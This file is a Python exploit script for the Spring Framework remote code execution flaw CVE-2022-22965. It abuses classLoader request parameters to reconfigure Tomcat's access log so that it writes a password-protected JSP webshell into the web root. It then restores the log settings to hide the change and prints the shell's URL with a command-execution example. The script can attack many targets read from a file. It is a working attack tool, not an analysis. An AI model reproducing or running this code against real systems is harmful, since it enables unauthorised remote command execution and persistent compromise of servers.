import requests
import argparse
from urllib.parse import urljoin, urlencode, urlparse


def default_accesslog_valve(url):
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
    }
    pattern = '%h %l %u %t "%r" %s %b'

    params = {
        'class.module.classLoader.resources.context.parent.pipeline.first.pattern': pattern,
        'class.module.classLoader.resources.context.parent.pipeline.first.suffix': '.txt',
        'class.module.classLoader.resources.context.parent.pipeline.first.directory': 'logs',
        'class.module.classLoader.resources.context.parent.pipeline.first.prefix': 'localhost_access_log',
        'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat': '.yyyy-MM-dd'}
    res = requests.post(url, headers=headers, data=urlencode(params), timeout=15, allow_redirects=False,
                       verify=False)


def exploit(url):
    headers = {"suffix": "%>",
               "prefix": "<%",
               "Content-Type": "application/x-www-form-urlencoded"
               }

    pattern = '%{prefix}i@ page contentType="text/html;charset=UTF-8"%{suffix}i' \
              ' %{prefix}i@ page import="java.io.BufferedReader,java.io.InputStreamReader" %{suffix}i' \
              ' %{prefix}i if("j".equals(request.getParameter("pwd"))){' \
              ' java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();' \
              ' BufferedReader reader=new BufferedReader(new InputStreamReader(in,"GBK"));' \
              ' String line;' \
              ' while ((line=reader.readLine())!=null){' \
              ' out.println(line); out.println("<br/>");' \
              '} reader.close(); ' \
              '}%{suffix}i'

    params = {
        'class.module.classLoader.resources.context.parent.pipeline.first.pattern': pattern,
        'class.module.classLoader.resources.context.parent.pipeline.first.suffix': '.jsp',
        'class.module.classLoader.resources.context.parent.pipeline.first.directory': 'webapps/ROOT',
        'class.module.classLoader.resources.context.parent.pipeline.first.prefix': 'webshell',
        'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat': '',
    }

    urlparse_result = urlparse(url)
    res = requests.post(url, headers=headers, data=urlencode(params), timeout=15, allow_redirects=False,
                       verify=False)
    print(res.content)
    default_accesslog_valve(url)
    shellurl = urljoin(f'{urlparse_result.scheme}://{urlparse_result.netloc}', 'webshell.jsp')
    res = requests.get(shellurl, timeout=15, allow_redirects=False, verify=False)
    if res.status_code == 200:
        shellurl_with_param = f"{shellurl}?{urlencode({'pwd': 'j', 'cmd': 'cmd /c calc'})}"
        print(f"CVE-2022-22965存在，shell地址为:{shellurl_with_param}")


def main():
    parser = argparse.ArgumentParser(description='Spring Framework RCE.')
    parser.add_argument('--file', help='url file', required=False)
    parser.add_argument('--url', help='target url', required=False)
    args = parser.parse_args()
    if args.url:
        exploit(args.url)
    if args.file:
        with open(args.file) as f:
            for i in f.readlines():
                i = i.strip()
                exploit(i)


if __name__ == '__main__':
    main()
